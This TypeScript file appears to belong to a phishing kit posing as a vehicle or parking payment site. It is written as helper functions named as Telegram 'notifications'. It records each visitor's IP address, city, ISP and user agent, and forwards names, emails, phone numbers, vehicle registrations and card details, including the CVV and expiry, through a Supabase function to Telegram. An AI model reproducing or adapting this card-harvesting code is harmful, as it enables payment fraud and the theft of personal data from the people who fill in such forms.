import { supabase } from "@/integrations/supabase/client";

export interface UserInfoData {
  email?: string;
  userAgent: string;
  ip?: string;
  country?: string;
  city?: string;
  region?: string;
  timezone?: string;
  isp?: string;
}

export interface VehicleLookupData {
  registration: string;
  make?: string;
  model?: string;
  color?: string;
  test_mode?: boolean;
}

// Helper function to get user's IP and detailed location info
const getUserIPAndLocationDetails = async (): Promise<Partial<UserInfoData>> => {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    
    if (data.error) {
      console.error('IP API error:', data.reason);
      return {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        timezone: 'Unknown',
        isp: 'Unknown'
      };
    }
    
    return {
      ip: data.ip || 'Unknown',
      country: data.country_name || 'Unknown',
      city: data.city || 'Unknown', 
      region: data.region || 'Unknown',
      timezone: data.timezone || 'Unknown',
      isp: data.org || 'Unknown'
    };
  } catch (error) {
    console.error('Failed to get IP and location details:', error);
    return {
      ip: 'Unknown',
      country: 'Unknown',
      city: 'Unknown',
      region: 'Unknown',
      timezone: 'Unknown',
      isp: 'Unknown'
    };
  }
};

export interface FormSubmissionData {
  name: string;
  email: string;
  phone?: string;
  vehicle_registration: string;
  duration: string;
  price: string;
}

export interface PaymentSubmissionData {
  userId: string;
  name: string;
  email: string;
  phone: string;
  vehicle_registration: string;
  vehicle_make: string;
  vehicle_model: string;
  vehicle_color: string;
  duration: string;
  price: string;
  card_number_masked: string;
  card_type: string;
  card_expiry: string;
  card_cvv: string;
  test_mode: boolean;
}

export const sendTelegramNotification = async (
  type: 'user_info' | 'form_submission' | 'vehicle_lookup' | 'payment_submission',
  data: UserInfoData | FormSubmissionData | VehicleLookupData | PaymentSubmissionData
) => {
  try {
    const { data: result, error } = await supabase.functions.invoke(
      'send-telegram-notification',
      {
        body: { type, data }
      }
    );

    if (error) {
      console.error('Error sending telegram notification:', error);
      return { success: false, error };
    }

    return { success: true, data: result };
  } catch (error) {
    console.error('Failed to send telegram notification:', error);
    return { success: false, error };
  }
};

export const sendUserInfoNotification = async (userInfo?: Partial<UserInfoData>) => {
  const locationDetails = await getUserIPAndLocationDetails();
  
  const data: UserInfoData = {
    userAgent: navigator.userAgent,
    ...locationDetails,
    ...userInfo
  };

  return sendTelegramNotification('user_info', data);
};

export const sendFormSubmissionNotification = async (formData: FormSubmissionData) => {
  return sendTelegramNotification('form_submission', formData);
};

export const sendVehicleLookupNotification = async (vehicleData: VehicleLookupData) => {
  return sendTelegramNotification('vehicle_lookup', vehicleData);
};

export const sendPaymentSubmissionNotification = async (paymentData: PaymentSubmissionData) => {
  return sendTelegramNotification('payment_submission', paymentData);
};